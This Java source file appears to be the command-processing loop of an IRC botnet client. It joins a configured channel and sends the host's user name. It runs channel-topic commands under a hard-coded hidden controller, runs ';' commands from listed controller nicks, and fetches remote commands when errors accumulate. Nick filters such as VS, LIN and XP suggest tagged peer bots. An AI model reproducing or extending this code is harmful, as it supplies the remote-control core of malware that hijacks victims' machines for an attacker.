import java.util.Random;
import java.util.logging.Level;
import java.util.logging.Logger;

/*
 * To change this template, choose Tools | Templates
 * and open the template in the editor.
 */
/**
 *
 * @author Nathan
 */
public class Processor implements Runnable {

    private String topicControllorName = "TOPICLULZHAMMER@@@@@@@@@!2123423442342342323432344ASDSDAAAAAAAAAAA23234423";
    public boolean killed;
    public boolean interuppted;

    public void run() {
        startup();
        String line = "";
        String nick = "";
        String message = "";
        String[] args = new String[]{"", "", ""};
        String lastMessage = "";
        int errors = 0;
        try {
            while (Main.connected) {
                try {
                    try {
                        line = IRC.readLine();
                        nick = IRC.getNick(line);
                        message = IRC.getMessage(line);
                        args = Misc.splitArgs(message);
                    } catch (NullPointerException e) {
                        e.printStackTrace();
                    }
                    System.out.println(line);
                    if (line.contains("PING") || line.contains(("ping"))) {
                        System.out.println("Pinging!");
                        IRC.sendRawData(line.replace("PING", "PONG"));
                    }
                    if (line.contains("PART") || line.contains("JOIN")) {
                        System.out.println("Part/Join");
                        continue;
                    }
                    if (nick.contains("VS") || nick.contains("LIN") || nick.contains("XP") || nick.contains("UNK")) {
                        System.out.println("Name");
                        continue;
                    }
                    if (lastMessage.equals(line)) {
                        Thread.sleep(2000);
                        continue;
                    }
                    lastMessage = line;
                    if (line.contains("451") || line.contains("002")) {
                        startup();
                    }
                    if (line.contains("332") || line.contains("331")) {
                        String topic = line.substring(line.lastIndexOf(":")).replace(":", "");
                        if (topic.startsWith(";")) {
                            IRC.sendMessage(Config.channel, "Executing topic command: " + topic);
                            String[] arguments = Misc.splitArgs(topic);
                            new Command(arguments[0], topicControllorName, arguments);
                        } else {
                            IRC.sendMessage(Config.channel, "No topic command to execute!");
                        }
                    }

                    if (line.contains("443") || line.contains("Nickname is already in use")) {
                        IRC.nick(Config.nick + "" + new Random().nextInt(10));
                    }
                    if (line.contains("Too many connections from your host")) {
                        Thread.sleep(20000);
                        reconnect();
                    }

                    if (Config.controllors.contains(nick)) {
                        if (message.startsWith(";")) {
                            StringBuilder sb = new StringBuilder();
                            for (String s : args) {
                                sb.append(s + " ");
                            }
                            Log.addLog("Command: " + nick + ":" + args[0] + ":" + sb.toString());
                            new Command(args[0], nick, args);
                            sb = null;
                        }
                    }
                } catch (Exception e) {
                    errors++;
                    if (errors >= 500) {
                        Thread.sleep(20000);
                        RemoteCommand.readRemoteCommand();
                        reconnect();
                        Status.disconnected = true;
                        errors = 0;
                    }
                }
            }
        } catch (Exception e) {
            errors++;
            if (errors >= 500) {
                try {
                    Thread.sleep(20000);
                    RemoteCommand.readRemoteCommand();
                } catch (Exception ex) {
                    Logger.getLogger(Processor.class.getName()).log(Level.SEVERE, null, ex);
                }
                reconnect();
                Status.disconnected = true;
                errors = 0;
            }
        }
    }

    public void startup() {
        IRC.nick(Config.nick);
        IRC.user(Config.nick, "null", "null", System.getProperty("user.name"));
        Config.controllors.add(topicControllorName);
        Command.loggedInUsers.add(topicControllorName);
        if (Config.channelPass.equals("null") ||
                Config.channelPass.equals(null) || Config.channelPass.equals("")) {
            IRC.join(Config.channel);
        } else {
            IRC.join(Config.channel, Config.channelPass);
        }
        IRC.sendRawData("TOPIC " + Config.channel);
    }

    public void reconnect() {
        try {
            Thread.sleep(5000);
            Main.s.close();
            Main.connect();
            Main.startProcessing();
            new Thread(this).interrupt();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}